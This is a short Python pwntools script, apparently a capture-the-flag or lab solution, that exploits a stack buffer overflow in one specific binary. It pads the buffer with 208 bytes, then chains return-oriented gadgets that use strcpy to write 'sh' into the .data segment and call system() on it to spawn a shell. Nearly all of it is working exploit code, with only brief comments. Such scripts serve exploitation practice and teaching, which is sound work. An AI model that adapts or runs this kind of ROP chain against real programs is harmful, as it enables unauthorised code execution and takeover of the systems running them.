from pwn import *

s_address = 0x4004a3
h_address = 0x401036
syscall = 0x0000000000401040 #system
write_to = 0x0000000000404030 # location of .data segment to write the characters 'sh' to
strcpy_call = 0x0000000000401030
ret = 0x0000000000401016
pop_rdi_ret = 0x00000000004012ab
pop_rsi_pop_r15_ret = 0x00000000004012a9
dummy = b"C"*8

buf = b"A" * 208 # overwrite base pointer
buf += b"\x42" * 8 #Overwrite the return stack pointer

# Copy 's' to .data
buf += p64(ret)
buf += p64(pop_rdi_ret)
buf += p64(write_to)
buf += p64(pop_rsi_pop_r15_ret)
buf += p64(s_address) # writes the charcter 's' to .data
buf += dummy
buf += p64(strcpy_call)

# Copy 'h' to .data

buf += p64(pop_rdi_ret)
buf += p64(write_to + 0x1) # we are seeking +1 byte, to avoid overwriting our 's' charcter in .data section
buf += p64(pop_rsi_pop_r15_ret)
buf += p64(h_address) # writes the charcter 'h' to .data
buf += dummy
buf += p64(strcpy_call)

# call system(rdi)

buf += p64(pop_rdi_ret)
buf += p64(write_to)
buf += p64(syscall)

sys.stdout.buffer.write(buf)